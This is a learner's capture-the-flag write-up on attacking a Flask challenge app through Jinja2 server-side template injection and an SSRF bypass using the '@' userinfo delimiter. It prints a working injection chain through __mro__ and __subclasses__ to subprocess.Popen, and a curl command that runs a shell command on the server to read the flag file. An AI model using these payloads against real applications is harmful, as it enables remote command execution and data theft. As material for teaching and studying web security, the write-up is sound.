![[Pasted image 20241011092409.png]]

So I was only able to solve half of this challenge, and I never submitted the flag formally in the CTF. I have not had the chance to review Server Side Template Injections, or Server Side Request Forgeries in my offensive security studies yet. I did not identify the SSRF opportunity but I did identify the SSTI vulnerability. I was pretty proud that I was able to figure that part out without the explicity knowledge of the vulnerability. My web development and systems administration background paid off!

I will write about how I uncovered the SSTI, and discuss what I learned about the SSRF after researching afterwards. To do this, I downloaded the source code and ran locally with docker compose. To bypass the SSRF portion of the challenge I commented out the is_from_localhost decorator so I could access the /secret route.

The flag was kept at / and was named "random name".txt. To solve the challenge, you needed to craft a request that used SSRF to reach the /secret route and perform a SSTI to get the contents of the flag.

## SSTI

Looking through the code, I was able to find the part where user input was not sanitized and would run server-side in the Python code:

![[Pasted image 20241015094851.png]]

Looking at the "admin" variable, you can see that it is inserted into template string without any sanitation. Application side, we see that we can modify that admin variable:

```
<script>alert('hey')</script>
```

![[Pasted image 20241011155627.png]]

![[Pasted image 20241011155640.png]]

XSS is cool but client side code execution is not what we need to get this flag. 

I did some reading about the "render_template_string" Flask function and found that it uses Jinja templates!

I use Ansible a lot in my day job and I was excited that I understood how this is used. I have 3 years of experience working with Flask. Most of that work was for headless APIs and not serving web pages. 

So I just had to figure out how exactly to "pass in" executable code. I found that this could be accomplished with a double mustache. This was my proof of server-side code execution:


![[Pasted image 20241012092421.png]]

```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Connection: keep-alive' \
    $'http://localhost/secret?admin={{7*7}}'
```

Now I just needed to be able to execute the right server side code to get the contents of the flag.

For this I did need to turn to Google, here are the resources I read:
https://portswigger.net/web-security/server-side-template-injection
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

The medium article was particularly informative. I learned about how to call config.items() to see the Flask.config object. This is a dictionary representing the configuration of the Flask object. It contains the attributes, functions, and sub-classes necessary to run the application.

Looking at the config.items() object there is not much we can call that will help us get that flag. The article recommended using the from_object() method to inject a library into Flask.config. Best thing for that would be "os":

![[Pasted image 20241012120235.png]]

and now our output:

![[Pasted image 20241012120314.png]]

At this point I was completely reliant upon the Medium article and the hacktricks page. Navigating Python special attributes and methods is something I have had yet to encounter.

Something cool about offensive security is that it really is the "dark side" of the Information Systems domain. As a developer and a systems administrator, I have worked on Flask applications for 3 years. Seeing things from the dark side enables you to learn more about how the thing works. On the "light side" you would almost never have the need or desire to dive this deep into Flask and Python internals. But now I know and all sides of me are better off for it.

Now that we have the "os" library loaded into our config object I was able to find <class 'subprocess.Popen'> at index 351. Using the "css_url" object included in the code, I followed the article and crafted this nifty string:

```
/secret?admin={{css_url.__class__.__mro__[-1].__subclasses__()[351]}}
```

Here is what I learned about this string:
1. accesses the class object defining the css_url object
2. then it accesses the mro or "method resolution order" which is a tuple showing the inheritance hierarchy of the whatever.\_\_class__. Accessing \[-1] will be the last object of the tuple, which is always object
3. In a Python execution context, modules and libraries attach to this root "object". Using the subclasses special method we can reach into those classes by their index. subprocess.Popen was at index 351.

With access to Popen I can call shell commands. Then we just need to add some code to get the contents out in a presentable format. The final injection looks like this:

```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Connection: keep-alive' \
    $'http://localhost/secret?admin={{css_url.__class__.__mro__[-1].__subclasses__()[351](\'cat+/wb85d3ph.txt\',shell=True,stdout=-1).communicate()[0].strip()}}'
```

To be honest I forgot about encoding the space after the cat command and had to research that as well.

AAAAAND a flag!
![[Pasted image 20241012153624.png]]

## SSRF

BUT in order to get here in the challenge you need to bypass the \@is_from_localhost decorator.

I have not had a chance to go over SSRF in my training so I did not figure this one out on my own. It is not hard to identify that again there was un-sanitized user input through the url GET variable - which was directly passed into a redirect. My previous training (surface level CompTia certifications) led me to understand that this could be an SSRF, but I had no direct experience of performing that attack (which is why I am playing CTF!) Googling around, I started reading about SSRF. Hacktricks had the best information:

https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#domain-parser

So I saw the use of the @ symbol in injection attempts. I tried a few combinations but had no such luck. I did not understand why the @ symbol was significant. At this point I ran out of time and had to abandon the challenge.

After the CTF closed, I looked at some write-ups. This one was the best I found:

https://github.com/ItsMeBrille/ctf-writeups/blob/main/TCP1P%20CTF/writeup.md#hacked

Having some time to reflect I realized that I did understand what an @ variable meant. I know that in Uniform Resource Identifier it is used to denote a username:password @ domain. I have obviously used this syntax a thousand times in SSH, HTTP, FTP, SMB connections. Unfortunately I did not make the connection for the malicious context.

Uniform Resource Identifiers are defined in RFC3986:
https://datatracker.ietf.org/doc/html/rfc3986

URIs can consist of 5 components: scheme, authority, path, query, fragment
```
foo://example.com:8042/over/there?name=ferret#nose
         \_/   \______________/\_________/ \_________/ \__/
          |           |            |            |        |
       scheme     authority       path        query   fragment
          |   _____________________|__
         / \ /                        \
         urn:example:animal:ferret:nose
```
There are many rules on syntax and delimiters and such. The @ symbol 
```
ftp://user:password@host:port/path
```
@ is a special delimiter to separate the userinfo from the domain.

In the code, the domain http://dafa.info is pre-pended 

![[Pasted image 20241016091419.png]]

So by using the @ symbol, we essentially negate the pre-pending action. We can use any number of localhost variants for the host to forger the request to the /secret route and make it appear like it came from localhost as the decorator requires.

So you would craft this string and add what I came up with for the SSTI, get the flag, and profit.
